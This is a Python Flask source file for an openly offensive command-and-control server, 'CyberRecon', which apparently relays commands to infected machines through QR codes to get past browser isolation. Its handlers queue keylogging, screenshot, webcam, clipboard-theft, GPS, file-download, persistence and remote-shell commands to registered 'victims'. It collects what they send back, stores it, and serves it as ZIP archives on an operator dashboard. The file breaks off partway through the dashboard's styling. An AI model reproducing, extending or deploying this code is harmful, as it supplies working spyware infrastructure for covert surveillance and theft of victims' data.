"""
CyberRecon C2 Server — v3.5 (HARDENED + AUTH + WIPE)
Implements Mandiant QR C2 Bypass for Browser Isolation.

v3.5 features:
  - Dashboard login (session cookie, HttpOnly, Secure, SameSite=Lax)
  - Read-only APIs gated behind login
  - Command-issuing APIs require login AND operator token
  - AES-256-GCM QR payload encryption
  - Victim shared-key auth (X-Victim-Key header or ?vkey= query)
  - Rate limiting on /register + victim cap
  - /self_destruct_notify — purge victim record on self-destruct
  - Optional self-signed TLS
"""

import base64
import io
import json
import os
import secrets
import shlex
import threading
import time
import zipfile
from collections import defaultdict
from datetime import datetime, timedelta
from functools import wraps
from io import BytesIO

from dotenv import load_dotenv

load_dotenv(dotenv_path=".env", override=True)

import qrcode
from flask import Flask, jsonify, redirect, render_template_string, request, send_file, session
from qrcode.constants import ERROR_CORRECT_H

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

app = Flask(__name__)

# ======== DASHBOARD SESSION ========
DASHBOARD_PASSWORD = os.getenv("CYBERRECON_DASHBOARD_PASSWORD", "")
SECRET_KEY = os.getenv("CYBERRECON_SECRET_KEY", "")
SESSION_HOURS = int(os.getenv("CYBERRECON_SESSION_HOURS", "8"))

if not SECRET_KEY:
    SECRET_KEY = secrets.token_urlsafe(48)
    print("[!] CYBERRECON_SECRET_KEY not set — generating ephemeral key.")
    print("[!] Dashboard sessions will be logged out on every restart.")

app.secret_key = SECRET_KEY

_HAS_TLS = os.path.exists("cert.pem") and os.path.exists("key.pem")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=_HAS_TLS,
    PERMANENT_SESSION_LIFETIME=timedelta(hours=SESSION_HOURS),
)


def require_dashboard_login(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in"):
            if request.path.startswith("/dashboard"):
                return login_page()
            return jsonify({"error": "Login required"}), 401
        return f(*args, **kwargs)
    return wrapper


# ======== AUTH ========
OPERATOR_TOKEN = os.getenv("CYBERRECON_OPERATOR_TOKEN", "")
REQUIRE_AUTH = os.getenv("CYBERRECON_REQUIRE_AUTH", "true").lower() == "true"
VICTIM_KEY = os.getenv("CYBERRECON_VICTIM_KEY", "")
REQUIRE_VICTIM_KEY = os.getenv("CYBERRECON_REQUIRE_VICTIM_KEY", "true").lower() == "true"


def require_operator_token(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not REQUIRE_AUTH:
            return f(*args, **kwargs)
        if not OPERATOR_TOKEN:
            return jsonify({"error": "Server misconfigured: CYBERRECON_OPERATOR_TOKEN not set"}), 503
        token = request.headers.get("X-Operator-Token", "")
        if not token or not secrets.compare_digest(token, OPERATOR_TOKEN):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


def require_victim_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not REQUIRE_VICTIM_KEY:
            return f(*args, **kwargs)
        if not VICTIM_KEY:
            return jsonify({"error": "Server misconfigured: CYBERRECON_VICTIM_KEY not set"}), 503
        key = request.headers.get("X-Victim-Key", "") or request.args.get("vkey", "")
        if not key or not secrets.compare_digest(key, VICTIM_KEY):
            return jsonify({"error": "Unauthorized victim"}), 401
        return f(*args, **kwargs)
    return wrapper


# ======== CRYPTO ========
C2_KEY = os.getenv("CYBERRECON_KEY", "")
_aesgcm = None
if C2_KEY and HAS_CRYPTO:
    try:
        _aesgcm = AESGCM(base64.urlsafe_b64decode(C2_KEY))
        print("[+] QR payload encryption: AES-256-GCM ENABLED")
    except Exception as e:
        print(f"[!] Invalid CYBERRECON_KEY: {e}")
elif C2_KEY and not HAS_CRYPTO:
    print("[!] CYBERRECON_KEY set but 'cryptography' not installed — plaintext mode")
else:
    print("[!] CYBERRECON_KEY not set — plaintext mode (client must match)")


def protect_payload(payload_bytes):
    if _aesgcm:
        nonce = secrets.token_bytes(12)
        ct = _aesgcm.encrypt(nonce, payload_bytes, None)
        return base64.b64encode(nonce + ct).decode()
    return base64.b64encode(payload_bytes).decode()


# ======== RATE LIMIT ========
_register_attempts = defaultdict(list)
_register_lock = threading.Lock()
REGISTER_MAX = 5
REGISTER_WINDOW = 60
VICTIM_CAP = 100


def _register_allowed(ip):
    now = time.time()
    with _register_lock:
        hits = [t for t in _register_attempts[ip] if now - t < REGISTER_WINDOW]
        if len(hits) >= REGISTER_MAX:
            _register_attempts[ip] = hits
            return False
        hits.append(now)
        _register_attempts[ip] = hits
        return True


# ======== STORAGE ========
victims = {}
victims_lock = threading.Lock()
VICTIMS_FILE = "victims_state.json"


def _trim(v):
    v["screenshots"] = v["screenshots"][-10:]
    v["webcam_snaps"] = v["webcam_snaps"][-10:]
    v["keystrokes"] = v["keystrokes"][-100:]
    v["locations"] = v["locations"][-10:]
    v["outputs"] = v["outputs"][-50:]
    v["files"] = v["files"][-20:]
    v["exfil_buffer"] = v["exfil_buffer"][-50:]


def save_victims():
    with victims_lock:
        try:
            for v in victims.values():
                _trim(v)
            with open(VICTIMS_FILE, "w") as f:
                json.dump(victims, f)
        except Exception as e:
            print(f"[!] Save victims failed: {e}")


def load_victims():
    global victims
    if os.path.exists(VICTIMS_FILE):
        try:
            with open(VICTIMS_FILE) as f:
                victims = json.load(f)
            print(f"[+] Loaded {len(victims)} victims from disk")
        except Exception as e:
            print(f"[!] Load victims failed: {e}")


# ======== COMMAND TEMPLATES ========
COMMAND_TEMPLATES = {
    "whoami": {"cmd": "whoami", "args": [], "type": "system"},
    "screenshot": {"cmd": "screenshot", "args": [], "type": "exfil"},
    "webcam_snap": {"cmd": "webcam_capture", "args": [], "type": "exfil"},
    "keylog_start": {"cmd": "keylogger", "args": ["start"], "type": "persist"},
    "keylog_stop": {"cmd": "keylogger", "args": ["stop"], "type": "persist"},
    "clipboard_get": {"cmd": "clipboard_steal", "args": [], "type": "exfil"},
    "download": {"cmd": "file_download",
                 "args": ["~/CyberReconSandbox/secret.pdf"],
                 "type": "exfil"},
    "gps_locate": {"cmd": "gps_location", "args": [], "type": "exfil"},
    "process_list": {"cmd": "process_list", "args": [], "type": "system"},
    "system_info": {"cmd": "system_info", "args": [], "type": "system"},
    "persist": {"cmd": "persist", "args": [], "type": "persist"},
    "self_destruct": {"cmd": "self_destruct", "args": [], "type": "stealth"},
    "shell": {"cmd": "shell", "args": ["whoami"], "type": "system"},
    "list_files": {"cmd": "list_files", "args": ["~/CyberReconSandbox"], "type": "system"},
}

OUTPUT_TYPES = ("whoami", "system_info", "process_list", "clipboard",
                "shell", "file", "list_files")
EXCLUSIVE_EXFIL = {"screenshot", "webcam_capture", "clipboard_steal", "gps_location"}


# ======== QR ENCODER ========
_qr_cache = {}
_heartbeat_qr = None


def encode_command_to_qr(command_dict, size=400):
    global _qr_cache
    raw = json.dumps(command_dict, sort_keys=True).encode()
    payload = protect_payload(raw)

    if len(payload) > 500:
        raise ValueError(
            f"Command payload too large for QR ({len(payload)} b64 chars)."
        )

    cache_key = payload
    if cache_key in _qr_cache:
        return BytesIO(_qr_cache[cache_key])

    qr = qrcode.QRCode(version=None, error_correction=ERROR_CORRECT_H,
                       box_size=10, border=4)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img = img.resize((size, size))
    buf = BytesIO()
    img.save(buf, format="PNG")
    data = buf.getvalue()

    _qr_cache[cache_key] = data
    if len(_qr_cache) > 500:
        _qr_cache.pop(next(iter(_qr_cache)))

    return BytesIO(data)


def get_heartbeat_qr():
    global _heartbeat_qr
    if _heartbeat_qr is None:
        _heartbeat_qr = encode_command_to_qr(
            {"cmd": "heartbeat", "ts": 0, "id": "hb"}
        ).getvalue()
    return _heartbeat_qr


# ======== LOGIN PAGE ========

LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CyberRecon • Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #06080f; --card: #0f1524; --border: #1a2440;
    --text: #e8edf7; --muted: #4a5a78; --accent: #00d4ff;
    --danger: #ff3b5c;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text);
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background-image:
      radial-gradient(circle at 20% 20%, rgba(0,212,255,0.08) 0%, transparent 50%),
      radial-gradient(circle at 80% 80%, rgba(0,255,136,0.05) 0%, transparent 50%);
  }
  .box {
    background: var(--card); border: 1px solid var(--border);
    border-radius: 16px; padding: 40px; width: 380px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
  }
  h1 {
    font-size: 20px; font-weight: 700; margin-bottom: 6px;
    background: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  }
  p.sub { color: var(--muted); font-size: 11px; letter-spacing: 1px;
          text-transform: uppercase; margin-bottom: 24px; }
  label { display: block; font-size: 12px; color: var(--muted);
          margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
  input {
    width: 100%; padding: 12px 14px; background: #131a2e;
    border: 1px solid var(--border); border-radius: 8px;
    color: var(--text); font-family: 'JetBrains Mono', monospace;
    font-size: 14px; outline: none; margin-bottom: 16px;
  }
  input:focus { border-color: var(--accent); }
  button {
    width: 100%; padding: 12px; background: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
    border: none; border-radius: 8px; color: #06080f; font-family: inherit;
    font-weight: 700; font-size: 14px; cursor: pointer;
  }
  .err { color: var(--danger); font-size: 12px; margin-bottom: 14px; display: none; }
  .err.show { display: block; }
</style>
</head>
<body>
  <form class="box" method="POST" action="/login">
    <h1>⚡ CyberRecon</h1>
    <p class="sub">Operator Authentication Required</p>
    {% if error %}<div class="err show">{{ error }}</div>{% endif %}
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" required>
    <button type="submit">AUTHENTICATE</button>
  </form>
</body>
</html>"""


def login_page(error=""):
    return render_template_string(LOGIN_HTML, error=error)


@app.route("/login", methods=["GET", "POST"])
def login():
    if not DASHBOARD_PASSWORD:
        return jsonify({
            "error": "Server misconfigured: CYBERRECON_DASHBOARD_PASSWORD not set"
        }), 503
    if request.method == "GET":
        return login_page()
    pw = (request.form.get("password") or "").strip()
    if not pw or not secrets.compare_digest(pw, DASHBOARD_PASSWORD):
        time.sleep(0.4)
        return login_page("Invalid password"), 401
    session.clear()
    session["logged_in"] = True
    session.permanent = True
    return redirect("/dashboard")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/login")


# ======== REST API ========

@app.route("/")
def index():
    return jsonify({
        "status": "CyberRecon C2 Server Active",
        "mode": "QR-Visual-Bypass",
        "reference": "Mandiant (2024)",
        "victims_online": len(victims),
        "encryption": "AES-256-GCM" if _aesgcm else "none",
    })


@app.route("/register", methods=["POST"])
@require_victim_key
def register_victim():
    if not _register_allowed(request.remote_addr or "unknown"):
        return jsonify({"error": "Rate limited"}), 429

    data = request.get_json() or {}
    victim_id = secrets.token_hex(16)

    with victims_lock:
        if len(victims) >= VICTIM_CAP:
            offline = [k for k, v in victims.items() if v.get("status") == "offline"]
            if offline:
                del victims[offline[0]]
            else:
                return jsonify({"error": "Victim cap reached"}), 503

        victims[victim_id] = {
            "id": victim_id,
            "ip": request.remote_addr,
            "hostname": data.get("hostname", "unknown"),
            "os": data.get("os", "unknown"),
            "user": data.get("user", "unknown"),
            "registered_at": datetime.now().isoformat(),
            "last_seen": time.time(),
            "command_queue": [],
            "exfil_buffer": [],
            "screenshots": [],
            "webcam_snaps": [],
            "keystrokes": [],
            "locations": [],
            "files": [],
            "outputs": [],
            "status": "online"
        }
    save_victims()
    print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
    return jsonify({"victim_id": victim_id, "status": "registered"})


@app.route("/qr/<victim_id>")
@require_victim_key
def get_qr_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        cmd = victim["command_queue"][0] if victim["command_queue"] else None

    if cmd is None:
        resp = send_file(BytesIO(get_heartbeat_qr()), mimetype="image/png")
    else:
        try:
            resp = send_file(encode_command_to_qr(cmd), mimetype="image/png")
        except ValueError as e:
            print(f"[!] QR encode failed: {e}")
            resp = send_file(BytesIO(get_heartbeat_qr()), mimetype="image/png")

    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/command/<victim_id>", methods=["POST"])
@require_dashboard_login
@require_operator_token
def queue_command(victim_id):
    data = request.get_json() or {}
    cmd_name = data.get("command", "whoami")
    custom_args = data.get("args", [])
    if cmd_name not in COMMAND_TEMPLATES:
        return jsonify({"error": f"Unknown command: {cmd_name}"}), 400
    cmd = COMMAND_TEMPLATES[cmd_name].copy()
    if custom_args:
        cmd["args"] = custom_args
    cmd["ts"] = time.time()
    cmd["id"] = secrets.token_hex(8)

    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        q = victims[victim_id]["command_queue"]
        if cmd["cmd"] in EXCLUSIVE_EXFIL:
            q[:] = [c for c in q if c.get("cmd") not in EXCLUSIVE_EXFIL]
        q.append(cmd)

    save_victims()
    print(f"[+] Command queued for {victim_id}: {cmd_name}")
    return jsonify({"status": "queued", "command": cmd})


@app.route("/shell/<victim_id>", methods=["POST"])
@require_dashboard_login
@require_operator_token
def queue_shell_command(victim_id):
    data = request.get_json() or {}
    raw = (data.get("command") or "").strip()
    if not raw:
        return jsonify({"error": "Empty command"}), 400

    blocked = set("|&;<>`$\n\r")
    if any(ch in raw for ch in blocked):
        return jsonify({"error": f"Blocked metacharacters in: {raw}"}), 400

    try:
        argv = shlex.split(raw)
    except ValueError as e:
        return jsonify({"error": f"Invalid syntax: {e}"}), 400
    if not argv:
        return jsonify({"error": "Empty command after parsing"}), 400

    cmd = {
        "cmd": "shell",
        "args": argv,
        "type": "system",
        "ts": time.time(),
        "id": secrets.token_hex(8),
        "operator_input": raw,
    }

    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        victims[victim_id]["command_queue"].append(cmd)

    save_victims()
    print(f"[+] Shell queued for {victim_id}: {raw}")
    return jsonify({"status": "queued", "command": cmd})


@app.route("/ack/<victim_id>", methods=["POST"])
@require_victim_key
def ack_command(victim_id):
    cmd_id = (request.get_json() or {}).get("id")
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        if cmd_id and cmd_id != "hb":
            q = victims[victim_id]["command_queue"]
            victims[victim_id]["command_queue"] = [c for c in q if c.get("id") != cmd_id]
    return jsonify({"status": "acked", "id": cmd_id})


@app.route("/exfil/<victim_id>", methods=["POST"])
@require_victim_key
def receive_exfil(victim_id):
    data = request.get_json() or {}
    data_type = data.get("type", "unknown")
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        entry = {
            "ts": datetime.now().isoformat(),
            "type": data_type,
            "size": len(str(data.get("data", ""))),
            "data": data.get("data", "")
        }
        victims[victim_id]["exfil_buffer"].append(entry)
        if data_type == "screenshot":
            victims[victim_id]["screenshots"].append(entry)
        elif data_type == "webcam":
            victims[victim_id]["webcam_snaps"].append(entry)
        elif data_type == "keystrokes":
            victims[victim_id]["keystrokes"].append(entry)
        elif data_type == "gps":
            victims[victim_id]["locations"].append(entry)
        elif data_type == "file":
            victims[victim_id]["files"].append(entry)
        if data_type in OUTPUT_TYPES:
            victims[victim_id]["outputs"].append(entry)
    save_victims()
    print(f"[EXFIL] {data_type} from {victim_id} ({entry['size']} bytes)")
    return jsonify({"status": "received"})


@app.route("/self_destruct_notify/<victim_id>", methods=["POST"])
@require_victim_key
def self_destruct_notify(victim_id):
    """Victim about to exit — purge its data from server memory + disk."""
    with victims_lock:
        if victim_id in victims:
            v = victims[victim_id]
            print(f"[WIPE] Self-destruct from {victim_id} "
                  f"({len(v['exfil_buffer'])} exfil entries purged)")
            del victims[victim_id]
            save_victims()
    return jsonify({"status": "wiped"})


@app.route("/victims")
@require_dashboard_login
def list_victims():
    with victims_lock:
        now = time.time()
        for v in victims.values():
            if now - v.get("last_seen", 0) > 300:
                v["status"] = "offline"

        return jsonify({
            "count": len(victims),
            "victims": [
                {
                    "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
                    "os": v["os"], "user": v["user"], "last_seen": v["last_seen"],
                    "pending_commands": len(v["command_queue"]),
                    "exfil_count": len(v["exfil_buffer"]),
                    "status": v["status"],
                    "screenshots_count": len(v["screenshots"]),
                    "webcam_count": len(v["webcam_snaps"]),
                    "keystrokes_count": len(v["keystrokes"]),
                    "locations_count": len(v["locations"]),
                    "outputs_count": len(v["outputs"])
                }
                for v in victims.values()
            ]
        })


@app.route("/victim/<victim_id>")
@require_dashboard_login
def get_victim(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
            "os": v["os"], "user": v["user"], "registered_at": v["registered_at"],
            "last_seen": v["last_seen"], "status": v["status"],
            "screenshots_count": len(v["screenshots"]),
            "webcam_count": len(v["webcam_snaps"]),
            "keystrokes_count": len(v["keystrokes"]),
            "locations_count": len(v["locations"]),
            "files_count": len(v["files"]),
            "outputs_count": len(v["outputs"]),
            "pending_commands": len(v["command_queue"])
        })


@app.route("/exfil-data/<victim_id>")
@require_dashboard_login
def get_exfil_data(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "screenshots": v["screenshots"][-5:],
            "webcam": v["webcam_snaps"][-5:],
            "keystrokes": v["keystrokes"][-20:],
            "locations": v["locations"][-3:],
            "outputs": v["outputs"][-10:]
        })


@app.route("/poll/<victim_id>")
@require_victim_key
def poll_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        if victim["command_queue"]:
            cmd = victim["command_queue"].pop(0)
            return jsonify(cmd)
        else:
            return jsonify({"cmd": "heartbeat", "ts": time.time(),
                            "id": secrets.token_hex(8)})


@app.route("/check")
def health_check():
    return jsonify({"status": "ok", "timestamp": time.time()})


# ======== BULK DOWNLOAD ========

@app.route("/download-all/<victim_id>")
@require_dashboard_login
@require_operator_token
def download_all_data(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            victim_info = {
                "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
                "os": v["os"], "user": v["user"],
                "registered_at": v["registered_at"], "last_seen": v["last_seen"],
                "screenshot_count": len(v["screenshots"]),
                "webcam_count": len(v["webcam_snaps"]),
                "keystrokes_count": len(v["keystrokes"]),
                "locations_count": len(v["locations"]),
                "outputs_count": len(v["outputs"])
            }
            zf.writestr("victim_info.json", json.dumps(victim_info, indent=2))

            for i, s in enumerate(v["screenshots"]):
                try:
                    img_bytes = base64.b64decode(s["data"])
                    ext = "png" if img_bytes[:4] == b"\x89PNG" else "jpg"
                    zf.writestr(f"screenshots/screenshot_{i:04d}.{ext}", img_bytes)
                except Exception:
                    pass

            for i, w in enumerate(v["webcam_snaps"]):
                try:
                    img_bytes = base64.b64decode(w["data"])
                    zf.writestr(f"webcam/webcam_{i:04d}.jpg", img_bytes)
                except Exception:
                    pass

            if v["keystrokes"]:
                text = "".join(f"[{k['ts']}] {k['data']}\n" for k in v["keystrokes"])
                zf.writestr("keystrokes/keylog.txt", text)

            if v["locations"]:
                locs = [{"ts": l["ts"], "data": l["data"]} for l in v["locations"]]
                zf.writestr("locations/gps_history.json", json.dumps(locs, indent=2))

            if v["outputs"]:
                text = ""
                for o in v["outputs"]:
                    text += f"\n{'='*60}\n[{o['ts']}] {o['type'].upper()}\n{'='*60}\n"
                    text += json.dumps(o["data"], indent=2) if isinstance(o["data"], dict) else str(o["data"])
                    text += "\n"
                zf.writestr("outputs/command_output.txt", text)

        zip_buffer.seek(0)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"CyberRecon_{v['hostname']}_{victim_id}_{timestamp}.zip"

    return send_file(zip_buffer, mimetype="application/zip",
                     as_attachment=True, download_name=filename)


# ======== IMAGE SERVING ========

def _serve_b64_image(img_data, mimetype):
    if not img_data:
        return jsonify({"error": "Empty image data"}), 404
    try:
        img_bytes = base64.b64decode(img_data)
        resp = send_file(BytesIO(img_bytes), mimetype=mimetype)
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
        resp.headers["Pragma"] = "no-cache"
        return resp
    except Exception as e:
        return jsonify({"error": f"Invalid image data: {e}"}), 400


@app.route("/latest_screenshot/<victim_id>")
@require_dashboard_login
def get_latest_screenshot(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        screenshots = victims[victim_id].get("screenshots", [])
        if not screenshots:
            return jsonify({"error": "No screenshots yet"}), 404
        img_data = screenshots[-1].get("data", "")

    if not img_data or img_data.startswith("["):
        return jsonify({"error": img_data or "No image"}), 404

    mimetype = "image/jpeg" if img_data.startswith("/9j/") else "image/png"
    return _serve_b64_image(img_data, mimetype)


@app.route("/latest_webcam/<victim_id>")
@require_dashboard_login
def get_latest_webcam(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        snaps = victims[victim_id].get("webcam_snaps", [])
        if not snaps:
            return jsonify({"error": "No webcam captures yet"}), 404
        img_data = snaps[-1].get("data", "")

    if not img_data or img_data.startswith("["):
        return jsonify({"error": img_data or "No image"}), 404

    return _serve_b64_image(img_data, "image/jpeg")


# ======== DASHBOARD ========

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberRecon • Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #06080f; --bg-secondary: #0d1220; --bg-tertiary: #131a2e; --bg-card: #0f1524;
            --border: #1a2440; --border-hover: #2a3a60;
            --text-primary: #e8edf7; --text-secondary: #7a8ba8; --text-muted: #4a5a78;
            --accent: #00d4ff; --accent-glow: rgba(0, 212, 255, 0.4);
            --success: #00ff88; --success-glow: rgba(0, 255, 136, 0.3);
            --warning: #ffb340; --danger: #ff3b5c;
            --gradient-1: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
            --shadow-glow: 0 0 20px var(--accent-glow);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary); color: var(--text-primary);
            min-height: 100vh; overflow-x: hidden;
            background-image:
                radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.06) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 255, 136, 0.04) 0%, transparent 50%);
            background-attachment: fixed;
        }
        body::before {
            content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background-image:
                linear-gradient(rgba(0, 212, 255, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 212, 255, 0.02) 1px, transparent 1px);
            background-size: 50px 50px; pointer-events: none; z-index: 0;
        }
        .header {
            position: sticky; top: 0; z-index: 100;
            background: rgba(13, 18, 32, 0.85);
            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border); padding: 14px 32px;
            display: flex; align-items: center; justify-content: space-between;
        }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon {
            width: 36px; height: 36px; background: var(--gradient-1); border-radius: 10px;
            display: flex; align-items: center; justify-content: center; font-size: 20px;
            box-shadow: var(--shadow-glow);
        }
        .logo-text {
            font-size: 18px; font-weight: 700; letter-spacing: -0.5px;
            background: var(--gradient-1); -webkit-background-clip: text;
            -webkit-text-fill-color: transparent; background-clip: text;
        }
        .logo-subtitle { font-size: 11px; color: var(--text-muted); letter-spacing: 0.5px; }
        .header-right { display: flex; align-items: center; gap: 16px; }
        .status-badge {
            display: flex; align-items: center; gap: 8px; padding: 6px 14px;
            background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px; font-size: 11px; font-weight: 600; color: var(--success);
        }
        .status-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
        .clock { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-secondary);
                 padding: 6px 12px; background: var(--bg-tertiary); border-radius: 8px; border: 1px solid var(--border); }
        .container { position: relative; z-index: 1; padding: 24px 32px; max-width: 1600px; margin: 0 auto; }
        .metrics { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; margin-bottom: 24px; }
        .metric-card {
            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
            padding: 20px; position: relative; overflow: hidden;
            transition: border-color 0.2s, transform 0.2s;
        }
        .metric-card:hover { border-color: var(--border-hover); transform: translateY(-2px); }
        .metric-value {
            font-size: 32px; font-weight: 800; color: var(--success);
            letter-spacing: -1px; line-height: 1; font-variant-numeric: tabular-nums;
        }
        .metric-label {
            font-size: 11px; color: var(--text-muted); margin-top: 8px;
            text-transform: uppercase; letter-spacing: 1px; font-weight: 600;
        }
        .grid { display: grid; grid-template-columns: 340px 1fr; gap: 20px; align-items: start; }
        .sidebar {
            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
            padding: 20px; display: flex; flex-direction: column;
            position: sticky; top: 84px; max-height: calc(100vh - 108px);
            overflow-y: auto; overflow-x: hidden;
        }
        .sidebar::-webkit-scrollbar { width: 8px; }
        .sidebar::-webkit-scrollbar-track { background: var(--bg-secondary); border-radius: 4px; }
        .sidebar::-webkit-scrollbar-thumb { background: var(--border-hover); border-radius: 4px; }
        .sidebar h3 {
            color: var(--accent); font-size: 12px; text-transform: uppercase;
            letter-spacing: 1.5px; margin-bottom: 16px; font-weight: 600;
        }
        .command-bar { display: flex; gap: 8px; margin-bottom: 16px; }
        .command-bar > button {
            padding: 10px 20px; background: var(--gradient-1); border: none; border-radius: 8px;
            color: #06080f; font-family: inherit; font-weight: 700; font-size: 13px; cursor: pointer;
        }
        .dropdown { position: relative; flex: 1; }
        .dropdown-toggle {
            width: 100%; padding: 10px 12px; background: var(--bg-tertiary);
            border: 1px solid var(--border); border-radius: 8px;
            color: var(--text-primary); font-family: inherit; font-size: 13px;
            cursor: pointer; text-align: left;
            display: flex; align-items: center; justify-content: space-between; gap: 8px;
        }
        .dropdown-arrow { color: var(--text-muted); font-size: 11px; }
        .dropdown-menu {
            position: absolute; top: calc(100% + 4px); left: 0; right: 0;
            background: var(--bg-tertiary); border: 1px solid var(--border-hover);
            border-radius: 10px; padding: 6px; max-height: 320px; overflow-y: auto;
            z-index: 500; display: none; box-shadow: var(--shadow-lg);
        }
        .dropdown-menu.open { display: block; }
        .dropdown-menu::-webkit-scrollbar { width: 8px; }
        .dropdown-menu::-webkit-scrollbar-thumb { background: var(--border-hover); border-radius: 4px; }
        .dropdown-item {
            padding: 9px 12px; font-size: 13px; color: var(--text-primary);
            border-radius: 6px; cursor: pointer; white-space: nowrap;
        }
        .dropdown-item:hover { background: var(--bg-card); color: var(--accent); }
        .dropdown-item.active { background: rgba(0, 212, 255, 0.12); color: var(--accent); }
        .download-btn {
            width: 100%; padding: 12px 20px; margin-top: 10px;
            background: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
            border: none; border-radius: 8px; color: #06080f; font-family: inherit;
            font-weight: 700; font-size: 13px; cursor: pointer;
        }
        .download-btn:disabled { opacity: 0.4; cursor: not-allowed; background: var(--bg-tertiary); color: var(--text-muted); }
        .victim-list { flex: 1; overflow-y: auto; max-height: 500px; display: flex; flex-direction: column; gap: 8px; }
        .victim-card {
            background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 10px;
            padding: 14px; cursor: pointer; transition: border-color 0.2s, transform 0.2s;
        }
        .victim-card:hover { border-color: var(--border-hover); transform: translateX(4px); background: var(--bg-card); }
        .victim-card.active { border-color: var(--success); background: rgba(0, 255, 136, 0.06); }
        .victim-card h4 { font-size: 13px; font-weight: 600; margin-bottom: 6px; }
        .victim-card p { color: var(--text-secondary); font-size: 11px; margin-top: 3px; font-family: 'JetBrains Mono', monospace; }
        .status-online { color: var(--success); font-weight: 600; }
        .status-offline { color: var(--danger); font-weight: 600; }
        .main-panel { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .panel {
            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
            padding: 20px; display: flex; flex-direction: column;
        }
        .panel h3 { color: var(--accent); font-size: 12px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 14px; font-weight: 600; }
        .panel-content {
            background: var(--bg-secondary); border-radius: 10px; flex: 1; min-height: 220px;
            overflow: hidden; position: relative;
        }
        .panel-content img { width: 100%; height: auto; display: block; border-radius: 8px; }
        .panel-content pre {
